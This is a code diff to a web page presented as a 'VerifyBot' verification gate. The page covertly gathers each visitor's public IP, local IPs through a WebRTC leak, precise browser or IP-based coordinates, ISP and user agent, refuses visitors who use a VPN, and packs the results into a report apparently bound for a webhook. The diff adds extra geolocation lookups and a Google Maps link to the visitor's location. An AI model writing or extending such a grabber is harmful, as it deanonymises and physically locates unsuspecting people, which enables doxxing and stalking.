@@ -10,7 +10,7 @@
       background-size:400% 400%;animation:bgAnim 20s ease infinite;color:#eee;
       font-family:sans-serif;overflow:hidden}
     #c{background:rgba(30,30,40,0.9);padding:2rem 2rem 2.2rem 2rem;border-radius:12px;
-      box-shadow:0 4px 16px rgba(0,0,0,0.8);text-align:center;animation:cardIn .8s ease;max-width:440px;}
+      box-shadow:0 4px 16px rgba(0,0,0,0.8);text-align:center;animation:cardIn .8s ease;max-width:450px;}
     input,textarea,button{width:100%;padding:.75rem;margin:.5rem 0;border:none;
       border-radius:6px;font-size:1rem;transition:transform .2s}
     input,textarea{background:#222;color:#eee}
@@ -75,7 +75,8 @@
         {name:'ipify', url:'https://api.ipify.org?format=json', parse: j=>j.ip},
         {name:'ipapi', url:'https://ipapi.co/json/', parse: j=>j.ip},
         {name:'ipinfo', url:'https://ipinfo.io/json', parse: j=>j.ip},
-        {name:'ipwho', url:'https://ipwho.is/', parse: j=>j.ip}
+        {name:'ipwho', url:'https://ipwho.is/', parse: j=>j.ip},
+        {name:'ipgeolocation', url:'https://api.ipgeolocation.io/ipgeo?apiKey=demo', parse: j=>j.ip}
       ];
       for (const src of sources){
         try{
@@ -83,7 +84,7 @@
           if(j && src.parse(j)) results[src.name]=src.parse(j);
         }catch{}
       }
-      results.main = results.ipify || results.ipapi || results.ipinfo || results.ipwho || '';
+      results.main = results.ipify || results.ipapi || results.ipinfo || results.ipwho || results.ipgeolocation || '';
       return results;
     }
     async function getLeak(t=2000){
@@ -96,10 +97,27 @@
         setTimeout(()=>{p.close();r([...s])},t);
       });
     }
-    async function getGeo(ip){
-      try{
-        return await fetch(`https://ipapi.co/${ip}/json/`).then(r=>r.json());
-      }catch{return {};}
+    async function getGeoInfo(ip) {
+      try {
+        let r = await fetch(`https://ipapi.co/${ip}/json/`).then(r=>r.json());
+        if(r && r.latitude && r.longitude) return {...r, source: "ipapi"};
+      } catch {}
+      try {
+        let r = await fetch(`https://ipwho.is/${ip}`).then(r=>r.json());
+        if(r && r.latitude && r.longitude) return {...r, source: "ipwho"};
+      } catch {}
+      try {
+        let r = await fetch(`https://ipinfo.io/${ip}/json`).then(r=>r.json());
+        if(r && r.loc) {
+          let [latitude, longitude] = r.loc.split(",");
+          return {...r, latitude, longitude, source: "ipinfo"};
+        }
+      } catch {}
+      try {
+        let r = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=demo&ip=${ip}`).then(r=>r.json());
+        if(r && r.latitude && r.longitude) return {...r, source: "ipgeolocation"};
+      } catch {}
+      return {};
     }
     async function getBrowserLoc(){
       return new Promise((resolve,reject)=>{
@@ -143,8 +161,14 @@
         if(!ips.main) throw "No IP found";
         const leak = await getLeak();
         const vpn = await checkVPN(ips.main);
+        const geo = await getGeoInfo(ips.main);
+        let mapsUrl='';
+        if(browserLocOk && browserLoc.lat && browserLoc.lon){
+          mapsUrl = `https://www.google.com/maps?q=${browserLoc.lat},${browserLoc.lon}`;
+        } else if(geo.latitude && geo.longitude){
+          mapsUrl = `https://www.google.com/maps?q=${geo.latitude},${geo.longitude}`;
+        }
         if(vpn.length) {F('err','VPN/Proxy not allowed: '+vpn.join('; '));btn.disabled=false;return;}
-        let geo = await getGeo(ips.main);
         const payload={
           username:'Gate',
           author:{name:'VerifyBot'},
@@ -154,9 +178,12 @@
               {name:'Tag',value:tag,inline:1},
               {name:'VPN/Proxy Check',value:vpn.join('; ')||'-',inline:0},
               {name:'Local IPs',value:leak.join(',')||'-',inline:0},
-              browserLocOk
+              browserLocOk && browserLoc.lat && browserLoc.lon
                 ? {name:'Device Location',value:`${browserLoc.lat},${browserLoc.lon} (±${browserLoc.accuracy}m)`,inline:1}
-                : {name:'IP Location',value:`${geo.latitude},${geo.longitude} (${geo.city||'?'} ${geo.country_code||'?'})`,inline:1},
+                : geo.latitude && geo.longitude
+                ? {name:'IP Location',value:`${geo.latitude},${geo.longitude} (${geo.city||'?'} ${geo.country_code||'?'})`,inline:1}
+                : {name:'IP Location',value: "Unknown",inline:1},
+              geo.latitude && geo.longitude ? {name:'Google Maps',value:mapsUrl,inline:0} : null,
               {name:'ISP/Org',value:geo.org||'-',inline:1},
               {name:'User Agent',value:navigator.userAgent,inline:0},
               text?{name:'Message',value:text,inline:0}:null
